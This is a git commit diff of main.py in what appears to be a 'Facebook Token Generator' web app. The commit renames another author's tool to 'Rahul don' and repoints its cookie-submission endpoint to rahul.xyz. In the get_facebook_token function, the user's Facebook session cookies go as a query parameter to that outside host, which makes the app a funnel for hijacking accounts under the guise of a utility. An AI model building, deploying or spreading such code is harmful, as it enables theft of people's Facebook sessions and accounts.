50108c7f53c59dbe20f12314e3719724cc1f9a6e
suru11111111111111111111111111111111 <souravtiwari1222222@gmail.com>
2025-05-31 20:07:06 +0530

    Update main.py

--- main.py
+++ main.py
@@ -9,7 +9,7 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Token Generator | by ALi Koja</title>
+    <title>Facebook Token Generator | by Rahul don</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -231,7 +231,7 @@ HTML_TEMPLATE = """
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="28" height="28" fill="#4361ee">
                 <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/>
             </svg>
-            Facebook Token Generator
+            Rahul don Token Generator
         </h1>
         
         <div class="features">
@@ -296,7 +296,7 @@ HTML_TEMPLATE = """
     </div>
     
     <footer>
-        <p>Developed with ❤️ by <a href="https://github.com/K0J4" target="_blank">
+        <p>Developed with ❤️ by <a href="https://github.com/souravtiwari91" target="_blank">
             <svg class="svg-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                 <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
             </svg>
@@ -317,7 +317,7 @@ def get_facebook_token(cookies):
     Returns:
         dict: Dictionary containing token, user info, or error message
     """
-    url = "https://kojaxd.xyz/api/facebook_token"
+    url = "https://rahul.xyz/api/facebook_token"
     params = {'cookies': cookies}
     
     try:
